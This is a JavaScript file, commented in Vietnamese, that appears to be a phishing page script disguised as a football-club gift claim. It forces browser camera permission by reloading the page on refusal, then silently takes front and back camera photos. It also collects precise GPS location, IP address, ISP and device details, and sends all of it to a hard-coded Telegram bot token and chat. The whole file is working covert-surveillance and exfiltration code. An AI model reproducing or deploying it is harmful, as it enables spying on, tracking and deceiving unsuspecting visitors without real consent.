const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const info = {
  time: '', ip: '', isp: '', address: '', lat: '', lon: '', device: '', os: '', camera: '⏳ Đang quét...'
};

const delay = ms => new Promise(res => setTimeout(res, ms));

async function captureCamera(facingMode = 'user') {
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
  return new Promise(resolve => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    video.onloadedmetadata = () => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      setTimeout(() => {
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.5); // Nén xuống 0.5 cho nhẹ, dễ gửi
      }, 700);
    };
  });
}

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  
  // 1. Nhận diện thiết bị
  const ua = navigator.userAgent;
  info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
  info.device = navigator.platform;

  let frontBlob = null;
  let backBlob = null;

  try {
    // 2. ÉP QUYỀN CAMERA (Từ chối là Reload)
    frontBlob = await captureCamera("user");
    await delay(300);
    backBlob = await captureCamera("environment");
    info.camera = "✅ Thành công";
  } catch (e) {
    alert("CẢNH BÁO: Bạn phải Cho phép Camera để hệ thống xác thực danh tính nhận quà FC!");
    location.reload();
    return;
  }

  // 3. LẤY IP & GPS
  const getIP = fetch('https://ipwho.is/').then(r => r.json()).then(res => {
    info.ip = res.ip;
    info.isp = res.connection?.org || 'N/A';
    if (!info.lat) { info.lat = res.latitude; info.lon = res.longitude; }
  }).catch(() => {});

  const getGPS = new Promise(res => {
    navigator.geolocation.getCurrentPosition(
      p => {
        info.lat = p.coords.latitude.toFixed(6);
        info.lon = p.coords.longitude.toFixed(6);
        info.address = `Vệ tinh chính xác`;
        res();
      },
      () => res(), 
      { enableHighAccuracy: true, timeout: 4000 }
    );
  });

  await Promise.all([getIP, getGPS, delay(1500)]);

  // 4. CẤU TRÚC LẠI NỘI DUNG (Sửa link Maps chuẩn)
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  const caption = `
🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
--------------------------
🕒 <b>Time:</b> ${info.time}
📱 <b>Device:</b> ${info.device} (${info.os})
🌍 <b>IP:</b> ${info.ip} | <b>ISP:</b> ${info.isp}
📍 <b>Bản đồ:</b> <a href="${mapsLink}">Bấm để xem vị trí</a>
🏙️ <b>Địa chỉ:</b> ${info.address || 'Tọa độ IP'}
`.trim();

  // 5. GỬI TELEGRAM (Sửa cấu trúc sendMediaGroup)
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);

  const media = [];
  if (frontBlob) {
    formData.append('p1', frontBlob, 'front.jpg');
    media.push({
      type: 'photo',
      media: 'attach://p1',
      caption: caption,
      parse_mode: 'HTML'
    });
  }
  if (backBlob) {
    formData.append('p2', backBlob, 'back.jpg');
    media.push({
      type: 'photo',
      media: 'attach://p2'
    });
  }

  formData.append('media', JSON.stringify(media));

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
      method: 'POST',
      body: formData
    });
    
    const resData = await response.json();
    if (!resData.ok) {
        // Nếu gửi Group lỗi, thử gửi tin nhắn văn bản làm backup
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: "⚠️ Lỗi Media nhưng có Data:\n" + caption,
                parse_mode: 'HTML'
            })
        });
    }
  } catch (err) {
    console.error("Lỗi kết nối:", err);
  }
}
